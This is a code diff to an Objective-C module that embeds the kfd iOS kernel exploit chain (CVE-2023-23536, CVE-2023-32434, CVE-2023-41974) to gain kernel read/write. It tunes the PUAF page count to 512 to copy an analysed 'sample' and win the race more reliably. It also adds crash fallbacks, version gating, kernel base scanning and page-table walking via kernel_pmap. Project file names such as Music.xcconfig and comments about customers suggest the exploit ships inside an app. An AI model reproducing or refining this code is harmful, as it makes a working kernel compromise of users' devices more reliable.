@@ -30,8 +30,106 @@
 
 /// kopen 返回的句柄。0 表示未就绪。
 static uint64_t g_handle = 0;
+
+/*
+ * 对外就绪标志，与 g_handle 分开。
+ *
+ * g_handle 一赋上，内部那几个步骤（扫 kernel base、定位线性映射）就都跑得动
+ * 了，所以它必须尽早发布；但"内部能跑"不等于"对外可用"。
+ * km_ready() 若直接返回 g_handle != 0，则 km_init 还在同一个线程里跑
+ * km_scan_kernel_base（最多几千次 kread）的时候，别的线程就能从
+ * km_ready() 拿到 true 并开始并发 kread。
+ *
+ * 而 libkfd 的后端不是线程安全的：kread_sem_open 每次读都要改写自己
+ * psemnode 的 pinfo，kwrite_sem_open 与 kread 共用同一块 krkw_method_data。
+ * 并发进去会让内核写入落到非预期地址 —— 那正是 vm_map 被写坏的形态。
+ *
+ * 所以拆成两个：g_handle 负责"内部可用"，g_kernel_ready 负责"对外可用"，
+ * 后者只在 km_init 全程走完之后才置位。
+ */
+static bool g_kernel_ready = false;
 /// 扫描得到的 kernel base（kernelcache 的 MH_MAGIC_64 所在地址）。
 static uint64_t g_kernel_base = 0;
+
+#pragma mark - 失败回退（对齐 kfd-mcp-ipad 的 kfd_glue_abort）
+
+/*
+ * 上游 kfd 的 assert 失败会 sleep(30) 再 exit(1)。对 Aether 这种长驻 app，
+ * 那意味着「一次 PUAFF 没落地 = 进程猝死」，而且它 sleep 的那 30 秒正好
+ * 把残留状态留在原地，下一次启动接着撞。
+ *
+ * 这里注册一个 longjmp 处理器，把失败降级成 kopen 返回 0：
+ * 应用可以干净地报错、不写内核、也不留下半截状态。
+ */
+kfd_assert_handler_t kfd_assert_handler = NULL;
+struct kfd_assert_site kfd_assert_last = { NULL, 0, NULL };
+
+/// kopen 的 setjmp 落点。只有 kfd_try_open 在跑时非 NULL。
+static jmp_buf g_kopen_jmp;
+static bool g_kopen_jmp_armed = false;
+
+/// 断言失败时由 common.h 的 assert 宏调用：不退出，跳回调用方。
+static void km_assert_fallback(void)
+{
+    if (g_kopen_jmp_armed) {
+        longjmp(g_kopen_jmp, 1);
+    }
+    /* 没武装（不在 kopen 调用窗口内）就交回 assert 的原路径。 */
+}
+
+/**
+ * 包一层 kopen：把「库内断言失败」从「进程猝死」降级成「返回 0」。
+ *
+ * 注意这里**不重试**。失败的 kopen 会在内核侧留下 PUAFF 残留（悬空 PTE、
+ * 半裁开的 vm_map 条目），而 sem_unlink 只清得掉用户态那个 semaphore 名字，
+ * 清不掉内核侧残留。在残留之上再跑一次 PUAFF，等于对已经不一致的 vm_map
+ * 再插一次 —— 失败概率是累积的，不是独立的。
+ * 想再试，交给下一次进程启动：那时 vm_map 是干净的。
+ */
+static uint64_t kfd_try_open(u64 puaf_pages, u64 puaf_method, u64 read_method, u64 write_method,
+                             const char **why)
+{
+    kfd_assert_handler = km_assert_fallback;
+
+    g_kopen_jmp_armed = true;
+    if (setjmp(g_kopen_jmp) == 0) {
+        uint64_t fd = kopen(puaf_pages, puaf_method, read_method, write_method);
+        g_kopen_jmp_armed = false;
+        if (fd != 0) {
+            return fd;
+        }
+        if (why) {
+            *why = "kopen returned 0 (PUAFF did not land)";
+        }
+    } else {
+        /* longjmp 回来：断言失败现场已记在 kfd_assert_last。 */
+        g_kopen_jmp_armed = false;
+        NSLog(@"[KernelMemory] kopen aborted at %s:%d (%s)",
+              kfd_assert_last.file ? kfd_assert_last.file : "?",
+              kfd_assert_last.line,
+              kfd_assert_last.cond ? kfd_assert_last.cond : "?");
+        if (why) {
+            *why = "kopen aborted (assert failed)";
+        }
+    }
+
+    /*
+     * 只清用户态的 posix semaphore 对象，然后**直接放弃**，不重试。
+     *
+     * 这里刻意做成"一次失败即终止本次会话"：
+     *  - sem_unlink 只能清掉用户态那个 semaphore 名字，清不掉 kopen 内部
+     *    已经动过的内核侧 PUAFF 残留（悬空 PTE、半裁开的 vm_map 条目）。
+     *  - 在残留之上再跑一次 PUAFF，等于对同一个已经不一致的 vm_map 再插一次
+     *    —— panic 概率不是三次独立失败，而是随次数累积上升。
+     *  - 上游 README 的立场也是"失败就停"，清理责任在 PUAFF 自己的 cleanup，
+     *    而不是靠重试掩盖。
+     *
+     * 想重试就交给下一次进程启动：那时 vm_map 是干净的。
+     */
+    sem_unlink("kfd-posix-semaphore");
+
+    return 0;
+}
 
 /// 当前进程 pmap 的内核地址（info_run 反查得到）。
 static uint64_t g_current_pmap = 0;
@@ -42,8 +140,21 @@ static bool g_linear_map_valid = false;
 /// struct pmap 的 tte 字段偏移。static_info.h 里 pmap 以 tte/ttep 开头。
 #define KM_PMAP_TTE_OFFSET 0x00
 
-/// PUAFF 页数。kopen 自己断言范围为 16 ... 2048，取上界提高成功率。
-static const u64 kfd_puaf_pages = 2048;
+/// PUAFF 页数。
+///
+/// 样本不是在启动时硬编码这个值，而是按设备动态选：
+///   sysctl "hw.cpufamily" + "hw.memsize" + os_proc_available_memory
+/// 据此在 {128, 160, 256, 512, 3072} 中挑一个。
+/// 本机（iPad Pro 2022 M2 / 8GB / iPadOS 16.4.1）走到的分支是 0x200 = 512，
+/// 已由离线 unicorn 模拟在 kopen 调用点实测读出（见
+/// _analysis/game/样本puaf_pages_按设备选择.md）。
+///
+/// 早先用 2048 是取的 kfd README 示例值，并不在样本的候选集合里；
+/// 页数直接决定 landa 竞态窗口宽度（MAX_WIRE_COUNT / vme3_size / mlock
+/// 循环范围都与之线性相关），差 4 倍足以让竞态从能赢变成必输。
+///
+/// kopen 自身断言范围为 16 ... 3072（实测），512 位于其中。
+static const u64 kfd_puaf_pages = 512;
 
 /// kernel base 反向扫描上限，防止踩到未映射区域形成死循环。
 static const uint64_t kfd_kbase_scan_max = 0x4000000; /* 64 MB */
@@ -91,6 +202,89 @@ static BOOL km_version_is_listed(NSString *kernVersion)
         }
     }
     return NO;
+}
+
+/**
+ * 版本是否在 kfd 的**下界**之上。
+ *
+ * 与 km_version_is_listed 互补：
+ *   km_version_is_listed    管"表里有没有"——负责上界（高于 16.6.1 无条目）
+ *   km_version_is_supported 管"低于下限"——负责下界（iOS 13/14 没有可用 PUAFF）
+ *
+ * 两者缺一不可。本工程部署目标是 iOS 13.0（project.yml / Music.xcconfig /
+ * Info.plist 的 MinimumOSVersion），所以 iOS 13/14 的设备**装得上**；但 kfd 的
+ * 三个 PUAFF 都要 iOS 15 起才存在，且 dynamic_info.h 最早只到 Darwin 21。
+ * 不挡这一道，那些设备会在 info_init 里撞 assert（app 直接闪退），而不是
+ * 收到一句明确的话。
+ */
+static BOOL km_version_is_supported(const char **why)
+{
+    NSString *kernVersion = km_read_kern_version();
+    if (kernVersion.length == 0) {
+        /* 读不到 kern.version 说明环境异常，不冒险往下走。 */
+        if (why) {
+            *why = "无法读取 kern.version";
+        }
+        return NO;
+    }
+
+    NSString *marker = @"Darwin Kernel Version ";
+    NSRange r = [kernVersion rangeOfString:marker];
+    if (r.location == NSNotFound) {
+        if (why) {
+            *why = "kern.version 格式无法识别";
+        }
+        return NO;
+    }
+
+    /* 取 "22.4.0"，遇到非数字/非点的字符（通常是 ':'）即停。 */
+    NSString *rest = [kernVersion substringFromIndex:NSMaxRange(r)];
+    NSMutableString *num = [NSMutableString string];
+    for (NSUInteger i = 0; i < rest.length; i++) {
+        unichar ch = [rest characterAtIndex:i];
+        if ((ch >= '0' && ch <= '9') || ch == '.') {
+            [num appendFormat:@"%C", ch];
+        } else {
+            break;
+        }
+    }
+    if (num.length == 0) {
+        if (why) {
+            *why = "kern.version 里解析不出 Darwin 版本号";
+        }
+        return NO;
+    }
+
+    NSInteger major = [[num componentsSeparatedByString:@"."] firstObject].integerValue;
+
+    /*
+     * 下界：Darwin 21（iOS 15.x）起才有可用 PUAFF。
+     *
+     * 但这里刻意把门槛抬到 Darwin 22（iOS 16.0）：iOS 15 虽然 PUAFF 存在，
+     * 本工程却走不通它 —— iOS < 16 会被分派到 kread_IOSurface 后端
+     * （见下方 readMethod 的 @available），而 dynamic_info.h 里 Darwin 21
+     * 那条的 ios__* 五个偏移全是 0（IndexedTimestampPtr / AllocSize /
+     * PixelFormat / UseCountPtr / ReadDisplacement），该后端完全依赖它们。
+     * 换句话说 iOS 15 会在拿全 0 偏移去操作 IOSurface 对象时失败或写坏内核。
+     *
+     * 与其让客户在 iOS 15 上撞莫名其妙的失败，不如在这里明确拒绝：
+     * 补齐 iOS 15 偏移需要有真机实测数据，目前没有。
+     */
+    if (major < 21) {
+        if (why) {
+            *why = "系统版本过低：kfd 的 PUAFF 从 iOS 15.0 起才存在（需要 iOS 16.0 及以上）";
+        }
+        return NO;
+    }
+    if (major == 21) {
+        if (why) {
+            *why = "iOS 15.x 暂不支持：本工程在 iOS 16 以下会走 IOSurface 后端，"
+                   "而该后端的偏移尚未取到实测数据（需要 iOS 16.0 及以上）";
+        }
+        return NO;
+    }
+
+    return YES;
 }
 
 /*
@@ -270,6 +464,34 @@ bool km_init(const char **err)
                                                             : kwrite_sem_open;
 
     /*
+     * ── 版本门：不在 kfd 支持区间内就干净拒绝，不调 kopen ──
+     *
+     * 为什么必须有这道门：本工程的部署目标是 iOS 13.0（project.yml /
+     * Music.xcconfig / Info.plist 的 MinimumOSVersion），也就是 iOS 13/14 的
+     * 设备**能装上**。但 kfd 的三个 PUAFF 对应的是 iOS 15.0 起才存在的漏洞：
+     *
+     *   physpuppet = CVE-2023-23536   iOS 15.0 起
+     *   smith      = CVE-2023-32434   iOS 16.4 起
+     *   landa      = CVE-2023-41974   iOS 16.4 起
+     *
+     * 在 15.0 以下根本没有可用的 PUAFF，而且 dynamic_info.h 最早只覆盖到
+     * Darwin 21；真的跑下去只会在 info_init 里撞 assert 或用到垃圾偏移。
+     * 宁可在这里给一句明确的话，也不要让客户看到"打开就重启"。
+     *
+     * 15.0–16.6.1 是完整支持区间（对应 dynamic_info.h 的 Darwin 21 / 22）。
+     */
+    const char *verWhy = NULL;
+    if (!km_version_is_supported(&verWhy)) {
+        NSString *ver = [[NSProcessInfo processInfo] operatingSystemVersionString];
+        if (err) {
+            *err = verWhy ? verWhy : "iOS 版本不在 kfd 支持区间（16.0 – 16.6.1）";
+        }
+        NSLog(@"[KernelMemory] unsupported OS, refusing to run exploit: %@ (%@)",
+              ver, verWhy ? [NSString stringWithUTF8String:verWhy] : @"?");
+        return false;
+    }
+
+    /*
      * 到这一步就没有回头路了：kopen 里 PUAFF 一旦失败，可能让**内核** panic
      * （整个设备彩屏重启，不是 app 崩）。NSLog 进 unified log、会落盘，
      * 所以彩屏之后这一行是唯一还能查到的参数记录。
@@ -280,10 +502,16 @@ bool km_init(const char **err)
           (readMethod == kread_IOSurface) ? "IOSurface" : "sem_open",
           (writeMethod == kwrite_IOSurface) ? "IOSurface" : "sem_open");
 
-    uint64_t handle = kopen(kfd_puaf_pages, puafMethod, readMethod, writeMethod);
+    /*
+     * 走 km 的失败回退：内核侧断言失败时 kopen 返回 0，而不是 sleep(30)+exit(1)。
+     * 注意这只挡「库级失败」——如果 PUAFF 已经把 vm_map 写坏、内核自己 panic，
+     * 用户态任何手段都拦不住，那需要靠不触发它来避免。
+     */
+    const char *openWhy = NULL;
+    uint64_t handle = kfd_try_open(kfd_puaf_pages, puafMethod, readMethod, writeMethod, &openWhy);
     if (handle == 0) {
         if (err) {
-            *err = "kopen returned 0 (PUAFF did not land)";
+            *err = openWhy ? openWhy : "kopen returned 0 (PUAFF did not land)";
         }
         return false;
     }
@@ -325,11 +553,22 @@ bool km_init(const char **err)
           kfd->info.env.pid, (unsigned long long)selfProc,
           (selfProc == kfd->info.kaddr.current_proc) ? @"OK" : @"MISMATCH");
 
+    /*
+     * 到这里才算对外就绪。放在最后一行，是为了让 km_ready() 在
+     * km_scan_kernel_base / km_locate_linear_map 跑完之前一直返回 false ——
+     * 否则别的线程会在这些内部 kread 还在进行时并发进来，而 libkfd 后端
+     * 不是线程安全的（kread 改自己的 psemnode，kwrite 与 kread 共用缓冲）。
+     */
+    g_kernel_ready = true;
+
     return true;
 }
 
 void km_deinit(void)
 {
+    /* 先撤就绪标志，再关句柄：顺序反了会让别的线程在 kclose 之后仍被放进来。 */
+    g_kernel_ready = false;
+
     if (g_handle == 0) {
         return;
     }
@@ -340,7 +579,7 @@ void km_deinit(void)
 
 bool km_ready(void)
 {
-    return g_handle != 0;
+    return g_kernel_ready && (g_handle != 0);
 }
 
 uint64_t km_kernel_base(void)
@@ -522,7 +761,7 @@ void km_self_test(char *out, size_t outSize)
                      gotPA ? "OK" : "FAIL", gotPTE ? "OK" : "FAIL",
                      (unsigned long long)probeVa);
         } else {
-            /* PTE 的 PA 补回 KVA，才能用 kwrite 落到它上面 */
+            /* PTE 的 PA 经线性映射补回 KVA，才能落到它上面读出来 */
             const uint64_t pte_kva = pte_PA + g_linear_delta;
 
             bool ok = false;
@@ -532,21 +771,29 @@ void km_self_test(char *out, size_t outSize)
                          "pte: pte_kva=%#llx 读失败 (FAIL)",
                          (unsigned long long)pte_kva);
             } else {
-                /* 原值写回 —— 不改变映射，只验证「能落到这条 PTE 上」 */
-                const bool wrote = km_write(pte_kva, &before, sizeof(before));
+                /*
+                 * 只读验证 —— 定位到这条 PTE 并把它读出来，到此为止。
+                 *
+                 * 早先这里还有一次 km_write(pte_kva, &before)「原值写回」，
+                 * 注释把它当零风险，其实不成立：PTE 里的值是物理页号 + 权限位，
+                 * 一旦 g_linear_delta 或 km_pte_for 任何一处算偏，就会把 A 页的
+                 * PTE 值写进 B 页的 PTE —— 凭空造出一个错配映射，而这正是
+                 * vm_map 被写坏、进而内核 panic 的经典入口。
+                 *
+                 * 何况 after == before 这个判据证明不了写入生效：kwrite 完全
+                 * 没落地时它照样成立。收益为零、风险为真，所以写入整段去掉。
+                 */
                 bool ok2 = false;
                 const uint64_t after = km_read64(pte_kva, &ok2);
 
                 snprintf(line, sizeof(line),
-                         "pte: va=%#llx pa=%#llx pte=%#llx walk=OK pte_for=OK wr=%s "
-                         "before=%#llx after=%#llx  %s",
+                         "pte: va=%#llx pa=%#llx pte=%#llx walk=OK pte_for=OK "
+                         "readonly %s value=%#llx",
                          (unsigned long long)probeVa,
                          (unsigned long long)page_PA,
                          (unsigned long long)pte_PA,
-                         wrote ? "OK" : "FAIL",
-                         (unsigned long long)before,
-                         (unsigned long long)(ok2 ? after : 0),
-                         (wrote && ok2 && after == before) ? "OK" : "MISMATCH");
+                         (ok2 && after == before) ? "OK" : "MISMATCH",
+                         (unsigned long long)(ok2 ? after : 0));
             }
         }
         used += (size_t)snprintf(out + used, outSize - used, "%s\n", line);
@@ -785,29 +1032,57 @@ bool km_locate_linear_map(void)
     g_current_pmap = kfd->info.kaddr.current_pmap;
 
     /*
-     * 主路径：kernel_proc 是目标内核一个确定的内核 VA，把它翻成 PA 再反解差值。
-     * 这一步成立与否当场可判 —— 成立说明「pmap 取链 + 页表走法 + 差值」
-     * 三件事同时对，比读任何符号表都可靠。
+     * 内核 VA 必须用 kernel_pmap 走。
+     *
+     * kernel_proc / current_proc 都是内核虚拟地址，早先这里用 current_pmap
+     * （用户进程的 pmap）去 walk 它们 —— 语义就是错的：用户 pmap 的页表里
+     * 没有内核空间的映射，要么走不通，要么走到一张不相干的表上，算出的
+     * delta 自然也不成立。而 delta 一旦不成立，km_pte_for 补回来的 KVA 就
+     * 指向别处。
+     *
+     * 这里优先用 kernel_pmap；它没填上（info_init 只在 kernel_proc 非 0 时
+     * 才填）或走不通时，再退到原来的 current_pmap 路径 —— 只加不删，
+     * 避免把原本能跑通的环境弄坏。
      */
+    const uint64_t kpmap = kfd->info.kaddr.kernel_pmap;
+
     char note[192] = {};
-    if (kfd->info.kaddr.kernel_proc &&
-        km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.kernel_proc,
-                                "kernel_proc", note, sizeof(note))) {
+    if (kpmap != 0 && kfd->info.kaddr.kernel_proc &&
+        km_compute_linear_delta(kpmap, kfd->info.kaddr.kernel_proc,
+                                "kernel_pmap+kernel_proc", note, sizeof(note))) {
         g_linear_map_valid = true;
         NSLog(@"[KernelMemory] linear map located: %@", @(note));
         return true;
     }
-    NSLog(@"[KernelMemory] linear map primary path failed: %@", @(note));
+    NSLog(@"[KernelMemory] kernel_pmap path unusable: %@", @(note));
 
     /*
-     * 兜底：kernel_proc 可能在 PPL 保护的页面上、走不过去。
-     * 换 current_proc 再试一次 —— 它是自己进程的 proc，必然可读。
+     * 次选：仍是内核 VA，但换 kernel_proc 以外的锚点，pmap 仍优先 kernel_pmap。
      */
+    if (kpmap != 0 && kfd->info.kaddr.current_proc &&
+        km_compute_linear_delta(kpmap, kfd->info.kaddr.current_proc,
+                                "kernel_pmap+current_proc", note, sizeof(note))) {
+        g_linear_map_valid = true;
+        NSLog(@"[KernelMemory] linear map located: %@", @(note));
+        return true;
+    }
+
+    /*
+     * 兜底：沿用旧的 current_pmap 路径。
+     */
+    if (kfd->info.kaddr.kernel_proc &&
+        km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.kernel_proc,
+                                "current_pmap+kernel_proc", note, sizeof(note))) {
+        g_linear_map_valid = true;
+        NSLog(@"[KernelMemory] linear map located via legacy path: %@", @(note));
+        return true;
+    }
+
     if (kfd->info.kaddr.current_proc &&
         km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.current_proc,
-                                "current_proc", note, sizeof(note))) {
+                                "current_pmap+current_proc", note, sizeof(note))) {
         g_linear_map_valid = true;
-        NSLog(@"[KernelMemory] linear map located via fallback: %@", @(note));
+        NSLog(@"[KernelMemory] linear map located via legacy fallback: %@", @(note));
         return true;
     }
 
